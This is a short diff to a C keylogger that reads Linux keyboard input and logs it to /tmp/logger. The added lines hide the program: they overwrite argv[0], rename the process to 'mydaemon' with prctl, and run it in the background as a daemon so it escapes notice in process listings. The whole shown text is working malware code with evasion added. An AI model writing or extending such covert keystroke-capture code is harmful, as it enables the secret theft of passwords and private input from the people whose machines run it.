@@ -5,6 +5,8 @@
 #include <linux/input.h>
 #include <string.h>
 #include <ctype.h>
+#include <linux/prctl.h>
+#include <sys/prctl.h>
 
 #define LOG "/tmp/logger"
 
@@ -100,7 +102,21 @@ void read_kbd(){
 }
 
 
-int main(){
-	//int background = daemon(1, 1);
+int main(int argc, char *argv[]){
+	memset(argv[0], '0', strlen(argv[0]));
+	strncpy(argv[0], "mydaemon", strlen(argv[0]));
+	
+	int background = daemon(1, 1);
+	
+	if(background == -1){
+		perror("[MAIN] Daemonizing failed: ");
+	}
+
+	int prctl_result = prctl(PR_SET_NAME, "mydaemon", 0, 0, 0);
+
+	if(prctl_result == -1){
+		perror("[MAIN] Error setting program name: ");
+	}
+
 	read_kbd();
 }
